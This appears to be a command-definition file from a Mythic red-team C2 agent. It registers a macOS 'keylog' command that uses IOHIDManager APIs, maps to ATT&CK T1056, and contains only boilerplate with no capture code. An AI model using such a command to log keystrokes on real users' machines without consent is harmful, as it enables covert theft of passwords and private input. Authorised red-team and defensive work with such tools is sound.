from mythic_payloadtype_container.MythicCommandBase import *
import json


class KeylogArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class KeylogCommand(CommandBase):
    cmd = "keylog"
    needs_admin = False
    help_cmd = "keylog"
    description = "Log keystrokes using IOHIDManager* APIs, requires 'Input Monitoring' permissions. Use 'jobkill' to kill the keylogger"
    version = 1
    author = "@slyd0g"
    argument_class = KeylogArguments
    attackmapping = ["T1056"]
    
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass